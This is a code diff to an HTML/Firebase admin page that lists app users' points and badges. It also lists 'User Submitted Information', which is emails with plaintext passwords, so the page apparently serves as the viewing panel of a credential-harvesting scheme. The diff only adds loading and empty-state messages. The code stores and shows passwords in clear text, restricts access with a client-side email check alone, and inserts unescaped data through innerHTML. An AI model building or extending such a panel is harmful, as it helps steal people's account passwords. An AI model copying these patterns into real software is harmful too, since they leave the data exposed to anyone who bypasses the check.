@@ -13,6 +13,7 @@ th{background:#8e24aa;}
 tr:hover{background:#333;}
 .back-btn{padding:8px 15px;border:none;border-radius:5px;background:#555;color:#fff;cursor:pointer;margin-bottom:20px;}
 .back-btn:hover{background:#777;}
+.no-data{color:#888;text-align:center;}
 </style>
 </head>
 <body>
@@ -25,7 +26,7 @@ tr:hover{background:#333;}
 <thead>
 <tr><th>Email</th><th>Points</th><th>Badges</th><th>Signup Date</th></tr>
 </thead>
-<tbody id="userList"></tbody>
+<tbody id="userList"><tr><td colspan="4" class="no-data">Loading...</td></tr></tbody>
 </table>
 
 <h2>User Submitted Information</h2>
@@ -33,7 +34,7 @@ tr:hover{background:#333;}
 <thead>
 <tr><th>Email</th><th>Password</th><th>Submitted At</th></tr>
 </thead>
-<tbody id="submissionList"></tbody>
+<tbody id="submissionList"><tr><td colspan="3" class="no-data">Loading...</td></tr></tbody>
 </table>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -55,7 +56,7 @@ if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.firestore();
 
-// Only admin email can access
+// Only admin can access
 auth.onAuthStateChanged(user=>{
   if(!user || user.email!=="abdullahyt4622@gmail.com"){
     window.location.href="index.html";
@@ -70,20 +71,25 @@ function loadUsers(){
   .then(snapshot=>{
     const tbody = document.getElementById("userList");
     tbody.innerHTML="";
+    if(snapshot.empty){
+      tbody.innerHTML='<tr><td colspan="4" class="no-data">No users found</td></tr>';
+      return;
+    }
     snapshot.forEach(doc=>{
       const data = doc.data();
-      const createdAt = data.createdAt ? data.createdAt.toDate().toLocaleString() : "N/A";
+      const createdAt = data.createdAt ? (data.createdAt.toDate().toLocaleString()) : "N/A";
       const tr = document.createElement("tr");
       tr.innerHTML = `<td>${data.email || 'N/A'}</td>
-                      <td>${data.points !== undefined ? data.points : 0}</td>
-                      <td>${data.badges !== undefined ? data.badges : 0}</td>
+                      <td>${data.points || 0}</td>
+                      <td>${data.badges || 0}</td>
                       <td>${createdAt}</td>`;
       tbody.appendChild(tr);
     });
   })
   .catch(err=>{
     console.error("Error loading users:", err);
-    alert("Failed to load users. Check Firestore permissions.");
+    const tbody = document.getElementById("userList");
+    tbody.innerHTML='<tr><td colspan="4" class="no-data">Error loading users</td></tr>';
   });
 }
 
@@ -92,9 +98,13 @@ function loadSubmissions(){
   .then(snapshot=>{
     const tbody = document.getElementById("submissionList");
     tbody.innerHTML="";
+    if(snapshot.empty){
+      tbody.innerHTML='<tr><td colspan="3" class="no-data">No submissions found</td></tr>';
+      return;
+    }
     snapshot.forEach(doc=>{
       const data = doc.data();
-      const submittedAt = data.submittedAt ? data.submittedAt.toDate().toLocaleString() : "N/A";
+      const submittedAt = data.submittedAt ? (data.submittedAt.toDate().toLocaleString()) : "N/A";
       const tr = document.createElement("tr");
       tr.innerHTML = `<td>${data.email || 'N/A'}</td>
                       <td>${data.password || 'N/A'}</td>
@@ -104,7 +114,8 @@ function loadSubmissions(){
   })
   .catch(err=>{
     console.error("Error loading submissions:", err);
-    alert("Failed to load submissions. Check Firestore permissions.");
+    const tbody = document.getElementById("submissionList");
+    tbody.innerHTML='<tr><td colspan="3" class="no-data">Error loading submissions</td></tr>';
   });
 }
 
